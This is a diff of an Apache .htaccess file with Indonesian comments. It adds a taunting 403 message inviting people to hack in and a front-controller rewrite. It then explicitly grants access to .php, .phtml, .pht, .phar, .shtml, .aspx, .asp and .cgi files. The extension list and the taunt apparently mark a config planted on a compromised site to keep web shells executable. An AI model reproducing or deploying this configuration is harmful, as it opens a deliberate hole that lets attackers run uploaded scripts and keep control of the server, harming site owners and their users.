@@ -1,31 +1,59 @@
+# ========================
+# PESAN 403 CUSTOM
+# ========================
+ErrorDocument 403 "Silahkan Retas Kalo Ingin Masuk P3NJ4RA!!!"
 
+# ========================
+# MATIKAN INDEXING
+# ========================
+Options -Indexes
 
-# Paksa semua file PHP di folder ini bisa diakses
-<FilesMatch "\.php$">
-    Allow from all
-</FilesMatch>
-
-# Matikan rewrite hacker di folder ini
+# ========================
+# REWRITE STANDARD
+# ========================
 <IfModule mod_rewrite.c>
-    RewriteEngine Off
+    RewriteEngine On
+    RewriteBase /
+
+    # JANGAN 403 halaman root (/), tapi 403 kalau akses subfolder/ langsung
+    RewriteCond %{REQUEST_URI} /$
+    RewriteCond %{REQUEST_URI} !^/$
+    RewriteRule ^ - [F]
+
+    # Front controller
+    RewriteRule ^index\.php$ - [L]
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule . /index.php [L]
 </IfModule>
 
-# Izinkan semua file
-<Files *>
+<Files *.php>
     Allow from all
 </Files>
-
-<IfModule mod_rewrite.c>
-    RewriteEngine Off
-</IfModule>
-
-<IfModule mod_authz_core.c>
-    <FilesMatch "\.php$">
-        Require all granted
-    </FilesMatch>
-</IfModule>
-
-<FilesMatch "\.php$">
-    Order allow,deny
+<Files *.phtml>
     Allow from all
-</FilesMatch>
+</Files>
+<Files *.pht>
+    
+    Allow from all
+</Files>
+<Files *.phar>
+    
+    Allow from all
+</Files>
+<Files *.shtml>
+    
+    Allow from all
+</Files>
+<Files *.aspx>
+    
+    Allow from all
+</Files>
+<Files *.asp>
+    
+    Allow from all
+</Files>
+<Files *.cgi>
+    
+    Allow from all
+</Files>
